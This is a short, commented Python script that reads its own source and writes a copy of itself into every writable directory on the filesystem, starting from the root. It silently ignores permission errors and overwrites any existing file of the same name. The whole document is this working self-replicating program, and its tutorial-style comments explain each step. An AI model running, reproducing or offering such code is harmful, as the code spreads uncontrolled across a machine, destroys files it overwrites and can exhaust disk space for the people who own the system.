import os
import sys
# sys.argv is the parameters given to
# the script, where the first element
# is the script name itself
# for example:
#    python3 hello.py a b c
# will have sys.argv equal to:
#    ['hello.py','a','b','c']
me = ''
with open(sys.argv[0], "r") as f:
  me = f.read()

# /a/b/c/hello.py -> hello.py
myname = os.path.basename(sys.argv[0])

# os.walk will keep crawiling the
# directory tree
for root, _, _ in os.walk("/"):
  # a/b/c, hello.py -> a/b/c/hello.py
  name = os.path.join(root, myname)

  try:
    with open(name, "w") as f:
      f.write(me)
  except:
    # might not have permissions to
    # write files in this directory so
    # we just ignore the error
    pass
